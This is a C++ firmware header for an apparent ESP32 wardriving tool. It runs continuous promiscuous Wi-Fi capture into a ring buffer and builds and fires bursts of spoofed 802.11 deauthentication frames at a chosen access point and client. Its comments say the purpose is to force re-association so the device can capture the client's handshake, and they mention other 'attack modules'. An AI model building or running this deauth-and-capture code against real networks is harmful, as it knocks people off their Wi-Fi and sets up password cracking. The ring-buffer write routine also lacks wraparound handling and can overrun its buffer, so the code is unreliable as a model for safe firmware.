// wardrive.h — Continuous capture + deauth-on-target for wardriving.
//
// ── HOW THIS DIFFERS FROM capture.h ──────────────────────────────────────────
// capture.h is a burst model: start, buffer, stop, pull. The phone gets a
// complete snapshot after the radio goes idle. That is the right shape for a
// targeted capture where every frame matters and dropping is failure.
//
// Wardrive is continuous: promiscuous stays ON, the ring buffer rotates, and the
// phone polls for segments. If a frame gets overwritten before the phone pulls
// it, that is fine — there will be another one just like it.
//
// ── DEAUTH ON TARGET ────────────────────────────────────────────────────────
// The phone sends hex BSSID + client. The firmware builds a deauth frame on
// device (unlike the tx.h model where the phone builds every frame), because
// deauths must go out fast and the command round-trip matters. The frame is
// always the same shape: 24-byte 802.11 header + 2-byte reason code. The phone
// is still the decision-maker; the firmware is the trigger.
//
// During deauth TX the promiscuous callback is paused so we do not hear our own
// frames. After the burst (via tx.h / tx_start) it re-enables and the ring
// buffer keeps filling where it left off.
//
// ── EXISTING ATTACK MODULES ─────────────────────────────────────────────────
// probe_reply.h and beacon_pool.h are not modified — wardrive is a separate mode.
// When wardrive is running, those modules are stopped (they conflict on the radio).

#pragma once

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_timer.h>
#include <esp_heap_caps.h>
#include <ArduinoJson.h>

#include "protocol.h"
#include "capture.h"    // CapRec, CAP_RT_LEN, cap_build_radiotap, cap_ch_freq
#include "tx.h"         // tx_start, tx_running, tx_poll, tx_stats

// ── Constants ────────────────────────────────────────────────────────────────

// Ring buffer: 512 KB from PSRAM. At ~300 bytes/frame (24 radiotap + ~250 avg
// frame) this holds ~1700 frames before overwriting.
#define WARD_RING_SIZE       (512u * 1024u)

// Min free space in the ring buffer before overwriting starts. Keeps the
// aggressive overwrite from micro-fragmenting the buffer conceptually — really
// just a threshold for when we advance the read pointer.
#define WARD_RING_LOW        1024

// Deauth frame: 24-byte 802.11 header + 2-byte reason code
#define WARD_DEAUTH_LEN      26

// Max frames per FT_PCAP payload (4096 / (24 + ~100) ≈ 7-8 worst-case with
// small frames; with full-size ~512-byte frames it is ~7).
#define WARD_FRAMES_PER_SEG  8

// ── State machine ────────────────────────────────────────────────────────────
enum WardState : uint8_t {
    WARD_IDLE      = 0,
    WARD_CAPTURING = 1,   // promiscuous ON, ring buffer filling
    WARD_DEAUTHING = 2,   // promiscuous paused, tx burst in flight
};

// ── Ring buffer ──────────────────────────────────────────────────────────────
// Circular: g_ward_head is where the next captured frame goes; g_ward_tail is
// where the next get_segment read starts. When head overtakes tail, the oldest
// frame is lost (no per-frame dropping — just slide tail forward past it).
static uint8_t*  volatile g_ward_buf    = nullptr;  // PSRAM allocation
static size_t    volatile g_ward_head   = 0;         // write cursor
static size_t    volatile g_ward_tail   = 0;         // read cursor
static uint32_t  volatile g_ward_frames = 0;         // frames captured since start
static uint32_t  volatile g_ward_dropped = 0;        // frames overwritten

static WardState volatile g_ward_state  = WARD_IDLE;
static uint8_t   volatile g_ward_ch     = 1;

// The command id of the last CMD_GET_SEGMENT, for streaming multiple FT_PCAP
// frames back to the same poll. -1 means no segment request in flight.
static int16_t   volatile g_ward_seg_id = -1;

// Deauth frame buffer — built once per deauth_now command, sent via tx_start.
static uint8_t   g_ward_deauth[WARD_DEAUTH_LEN];
static size_t    g_ward_deauth_len = 0;

// ── Helpers ──────────────────────────────────────────────────────────────────
static inline bool wardrive_running() { return g_ward_state != WARD_IDLE; }
static inline bool wardrive_capturing() { return g_ward_state == WARD_CAPTURING; }

// ── Ring buffer operations ──────────────────────────────────────────────────

// Allocate the ring buffer from PSRAM. Call once on first start.
static bool ward_ring_alloc() {
    if (g_ward_buf != nullptr) return true;
    g_ward_buf = (uint8_t*)heap_caps_malloc(WARD_RING_SIZE, MALLOC_CAP_SPIRAM);
    if (!g_ward_buf) return false;
    g_ward_head = 0;
    g_ward_tail = 0;
    return true;
}

// Write a CapRec + frame bytes into the ring buffer. Overwrites oldest frames
// when full. Called from the promiscuous callback — no allocations, no blocking.
static void ward_ring_write(const CapRec* rec, const uint8_t* frame, uint16_t frame_len) {
    size_t need = sizeof(CapRec) + frame_len;
    if (need > WARD_RING_SIZE) return;  // frame too large even for an empty ring

    // If the frame does not fit at the tail end of the buffer with a single
    // memcpy, wrap. The ring is contiguous-virtual for simplicity: we advance
    // head, and if it wraps past tail we advance tail to keep the invariant
    // (head - tail) < WARD_RING_SIZE.
    //
    // Because the buffer is used as one contiguous region with wraparound only
    // at the alloc boundary, we must never have head == tail unless the buffer
    // is empty. If head would land exactly on tail after writing, advance tail
    // by one frame (lose the oldest) to preserve the invariant.

    // Check if we need to evict to make room
    size_t used = (g_ward_head >= g_ward_tail)
                  ? (g_ward_head - g_ward_tail)
                  : (WARD_RING_SIZE - g_ward_tail + g_ward_head);

    if (used + need > WARD_RING_SIZE) {
        // Not enough room — advance tail until there is.
        size_t free_needed = used + need - WARD_RING_SIZE;
        size_t freed = 0;
        while (freed < free_needed && g_ward_tail != g_ward_head) {
            // Read the record at tail to know its length
            CapRec old;
            memcpy(&old, g_ward_buf + g_ward_tail, sizeof(old));
            size_t old_len = sizeof(CapRec) + old.len;
            if (old_len == 0 || old_len > WARD_RING_SIZE) old_len = sizeof(CapRec) + 64; // safety
            g_ward_tail = (g_ward_tail + old_len) % WARD_RING_SIZE;
            freed += old_len;
            g_ward_dropped++;
        }
    }

    // Copy the record and frame bytes
    memcpy(g_ward_buf + g_ward_head, rec, sizeof(CapRec));
    g_ward_head = (g_ward_head + sizeof(CapRec)) % WARD_RING_SIZE;

    memcpy(g_ward_buf + g_ward_head, frame, frame_len);
    g_ward_head = (g_ward_head + frame_len) % WARD_RING_SIZE;

    g_ward_frames++;

    // If head caught tail, advance tail past one record
    if (g_ward_head == g_ward_tail) {
        CapRec old;
        memcpy(&old, g_ward_buf + g_ward_tail, sizeof(old));
        size_t old_len = sizeof(CapRec) + old.len;
        if (old_len > WARD_RING_SIZE) old_len = sizeof(CapRec) + 64;
        g_ward_tail = (g_ward_tail + old_len) % WARD_RING_SIZE;
        g_ward_dropped++;
    }
}

// ── Deauth frame builder ─────────────────────────────────────────────────────
// Builds a raw 802.11 deauthentication frame.
//
// Frame layout (26 bytes):
//   [0-1]   Frame Control: 0xC0 0x00 (type=mgmt, subtype=deauth)
//   [2-3]   Duration: 0x0000
//   [4-9]   Address 1: client MAC (DA)
//   [10-15] Address 2: BSSID MAC (SA)
//   [16-21] Address 3: BSSID MAC
//   [22-23] Sequence Control: 0x0000
//   [24-25] Reason Code: 0x0001 (unspecified)
static void ward_build_deauth(const uint8_t* bssid, const uint8_t* client) {
    g_ward_deauth_len = WARD_DEAUTH_LEN;
    memset(g_ward_deauth, 0, WARD_DEAUTH_LEN);

    // Frame Control: management, deauthentication subtype
    g_ward_deauth[0] = 0xC0;   // subtype=12 (deauth), type=0 (mgmt), ver=0
    g_ward_deauth[1] = 0x00;

    // Duration (bytes 2-3): already 0 from memset

    // Address 1: receiver (client)
    memcpy(g_ward_deauth + 4, client, 6);

    // Address 2: transmitter (BSSID)
    memcpy(g_ward_deauth + 10, bssid, 6);

    // Address 3: BSSID
    memcpy(g_ward_deauth + 16, bssid, 6);

    // Sequence Control (bytes 22-23): 0 from memset

    // Reason Code: 1 = unspecified
    g_ward_deauth[24] = 0x01;
    g_ward_deauth[25] = 0x00;
}

// Parse a hex MAC string ("AA:BB:CC:DD:EE:FF" or "AABBCCDDEEFF") into 6 bytes.
// Returns true on success.
static bool ward_parse_mac(const char* hex, uint8_t* out) {
    if (!hex) return false;
    size_t n = strlen(hex);

    // Strip colons
    uint8_t buf[6];
    int idx = 0;
    for (size_t i = 0; i < n && idx < 6; i++) {
        char c = hex[i];
        if (c == ':') continue;
        int nib = 0;
        if (c >= '0' && c <= '9') nib = c - '0';
        else if (c >= 'a' && c <= 'f') nib = c - 'a' + 10;
        else if (c >= 'A' && c <= 'F') nib = c - 'A' + 10;
        else return false;

        if (i + 1 < n && hex[i+1] != ':') {
            // Two hex digits
            i++;
            int lo = 0;
            c = hex[i];
            if (c >= '0' && c <= '9') lo = c - '0';
            else if (c >= 'a' && c <= 'f') lo = c - 'a' + 10;
            else if (c >= 'A' && c <= 'F') lo = c - 'A' + 10;
            else return false;
            buf[idx++] = (uint8_t)((nib << 4) | lo);
        } else {
            buf[idx++] = (uint8_t)nib;
        }
    }
    if (idx != 6) return false;
    memcpy(out, buf, 6);
    return true;
}

// ── Promiscuous callback ─────────────────────────────────────────────────────
// Runs in the Wi-Fi driver task. Same constraints as cap_rx_cb: no blocking, no
// allocation, no JSON. Just writes to the ring buffer.
static void ward_rx_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (g_ward_state != WARD_CAPTURING) return;
    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;

    const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;
    uint32_t on_air = pkt->rx_ctrl.sig_len;
    if (on_air <= 4) return;

    uint32_t len = on_air - 4;
    if (len > CAP_SNAPLEN_MAX) len = CAP_SNAPLEN_MAX;

    CapRec rec;
    rec.ts_us    = (uint64_t)esp_timer_get_time();
    rec.len      = (uint16_t)len;
    rec.orig_len = (uint16_t)on_air;
    rec.channel  = g_ward_ch;
    rec.rssi     = (int8_t)pkt->rx_ctrl.rssi;

    ward_ring_write(&rec, pkt->payload, (uint16_t)len);
}

// ── Public API ───────────────────────────────────────────────────────────────

// Start continuous capture on the given channel (1-14).
// Returns true if promiscuous mode started, false on error (already running,
// no PSRAM, radio refused).
static bool wardrive_start(uint8_t channel) {
    if (g_ward_state != WARD_IDLE) return false;
    if (!wifi_channel_ok(channel)) return false;

    if (!ward_ring_alloc()) return false;

    // Reset ring buffer
    g_ward_head   = 0;
    g_ward_tail   = 0;
    g_ward_frames = 0;
    g_ward_dropped = 0;
    g_ward_ch     = channel;
    g_ward_seg_id = -1;

    // Put radio into STA mode for promiscuous
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(60);

    if (esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE) != ESP_OK) return false;

    wifi_promiscuous_filter_t filter;
    filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(&ward_rx_cb);

    g_ward_state = WARD_CAPTURING;
    if (esp_wifi_set_promiscuous(true) != ESP_OK) {
        g_ward_state = WARD_IDLE;
        esp_wifi_set_promiscuous_rx_cb(nullptr);
        return false;
    }

    return true;
}

// Stop continuous capture. Stops promiscuous, returns to idle.
static void wardrive_stop() {
    if (g_ward_state == WARD_IDLE) return;

    // If a deauth burst is in flight, stop it too
    if (g_ward_state == WARD_DEAUTHING && tx_running()) {
        tx_stop();
    }

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    g_ward_state = WARD_IDLE;
    g_ward_seg_id = -1;
}

// Fire a deauth burst: build frame, pause promiscuous, start tx.
// Returns true if the burst was started, false on error.
// The actual TX completion is handled by wardrive_poll().
static bool wardrive_deauth(const uint8_t* bssid, const uint8_t* client,
                            int count, int interval_ms, uint8_t cmd_id) {
    if (g_ward_state != WARD_CAPTURING) return false;

    // Build the deauth frame
    ward_build_deauth(bssid, client);

    // Stop promiscuous so we do not hear our own TX
    esp_wifi_set_promiscuous(false);

    g_ward_state = WARD_DEAUTHING;

    // Encode the deauth frame as hex for tx_start (the existing tx.h parsers hex)
    // Build hex string from g_ward_deauth
    char hex_buf[WARD_DEAUTH_LEN * 2 + 1];
    for (size_t i = 0; i < g_ward_deauth_len; i++) {
        static const char* hex = "0123456789ABCDEF";
        hex_buf[i * 2]     = hex[(g_ward_deauth[i] >> 4) & 0x0F];
        hex_buf[i * 2 + 1] = hex[g_ward_deauth[i] & 0x0F];
    }
    hex_buf[WARD_DEAUTH_LEN * 2] = '\0';

    // Clamp count/interval
    if (count < 1) count = 1;
    if (count > 32) count = 32;     // deauth bursts are short
    if (interval_ms < 10) interval_ms = 10;
    if (interval_ms > 1000) interval_ms = 1000;

    const char* why = nullptr;
    if (!tx_start(hex_buf, (int)g_ward_ch, count, interval_ms, cmd_id, &why)) {
        // Failed to start TX — resume capture
        esp_wifi_set_promiscuous(true);
        g_ward_state = WARD_CAPTURING;
        return false;
    }

    return true;
}

// Version of deauth that accepts hex strings for BSSID and client MAC.
// Returns true on success, false on parse error or radio conflict.
static bool wardrive_deauth_hex(const char* bssid_hex, const char* client_hex,
                                int count, int interval_ms, uint8_t cmd_id) {
    uint8_t bssid[6], client[6];
    if (!ward_parse_mac(bssid_hex, bssid)) return false;
    if (!ward_parse_mac(client_hex, client)) return false;
    return wardrive_deauth(bssid, client, count, interval_ms, cmd_id);
}

// Poll wardrive: step the deauth burst, resume capture when done.
// Returns true when state changes from DEAUTHING back to CAPTURING.
static bool wardrive_poll() {
    if (g_ward_state != WARD_DEAUTHING) return false;

    // Step the burst if the generic TX handler has not already stepped it.
    tx_poll();

    // Resume on the STATE, never on tx_poll()'s completion edge. That edge fires
    // on exactly one pass, and main.cpp's generic TX block runs EARLIER in the
    // same pass and consumes it — so an edge-based check here never sees it, the
    // state machine stays in DEAUTHING, promiscuous stays off, and the capture
    // dies on the first deauth. Measured: one deauth_now and the board stopped
    // delivering frames entirely, with every later deauth refused.
    // tx_poll() is bounded by TX_MAX_TOTAL_MS, so this cannot spin forever.
    if (tx_running()) return false;

    // Burst done — count reached, hard cap hit, or the driver refused. Re-enable
    // promiscuous so the client's re-association handshake can be heard; that
    // handshake is the entire point of deauthing.
    g_ward_state = WARD_CAPTURING;
    esp_wifi_set_promiscuous(true);
    return true;
}

// Get the next segment of captured frames. Calls `send_pcap` for each FT_PCAP
// frame, so the caller (main.cpp) provides the transport layer. Each FT_PCAP
// carries radiotap[24] + 802.11 frame bytes for up to WARD_FRAMES_PER_SEG frames.
//
// Returns the number of frames sent in this segment.
static size_t wardrive_get_segment(uint8_t cmd_id,
                                   void (*send_pcap)(uint8_t, const uint8_t*, size_t)) {
    if (g_ward_state == WARD_IDLE) return 0;

    static uint8_t out[CAP_RT_LEN + CAP_SNAPLEN_MAX];

    size_t   sent_frames = 0;
    uint8_t  chunk = 0;

    // Walk the ring buffer from tail to (head - 1), emitting frames.
    // Up to WARD_FRAMES_PER_SEG frames per call. The phone polls every ~200ms,
    // so we do not need to drain everything in one shot.
    while (sent_frames < WARD_FRAMES_PER_SEG && g_ward_tail != g_ward_head) {
        CapRec rec;
        memcpy(&rec, g_ward_buf + g_ward_tail, sizeof(rec));

        if (rec.len == 0 || rec.len > CAP_SNAPLEN_MAX) {
            // Corrupted — advance past this record
            g_ward_tail = (g_ward_tail + sizeof(CapRec) + 64) % WARD_RING_SIZE;
            continue;
        }

        size_t frame_off = (g_ward_tail + sizeof(CapRec)) % WARD_RING_SIZE;
        size_t total_len = sizeof(CapRec) + rec.len;

        // Build the radiotap header
        size_t rt = cap_build_radiotap(out, rec.ts_us, rec.channel, rec.rssi);

        // Copy frame bytes from the ring (handle wraparound)
        if (frame_off + rec.len <= WARD_RING_SIZE) {
            memcpy(out + rt, g_ward_buf + frame_off, rec.len);
        } else {
            // Wraparound: copy in two parts
            size_t first = WARD_RING_SIZE - frame_off;
            memcpy(out + rt, g_ward_buf + frame_off, first);
            memcpy(out + rt + first, g_ward_buf, rec.len - first);
        }

        send_pcap(chunk++, out, rt + rec.len);
        sent_frames++;

        // Advance tail past this record
        g_ward_tail = (g_ward_tail + total_len) % WARD_RING_SIZE;
    }

    return sent_frames;
}

// Fill a JSON document with wardrive stats for status replies.
static void wardrive_stats(JsonDocument& d) {
    size_t used = 0;
    if (g_ward_head >= g_ward_tail) {
        used = g_ward_head - g_ward_tail;
    } else {
        used = WARD_RING_SIZE - g_ward_tail + g_ward_head;
    }

    d["ward_running"]   = (g_ward_state != WARD_IDLE);
    d["ward_state"]     = (uint8_t)g_ward_state;
    d["ward_channel"]   = g_ward_ch;
    d["ward_frames"]    = g_ward_frames;
    d["ward_dropped"]   = g_ward_dropped;
    d["ward_ring_used"] = (uint32_t)used;
    d["ward_ring_size"] = (uint32_t)WARD_RING_SIZE;
}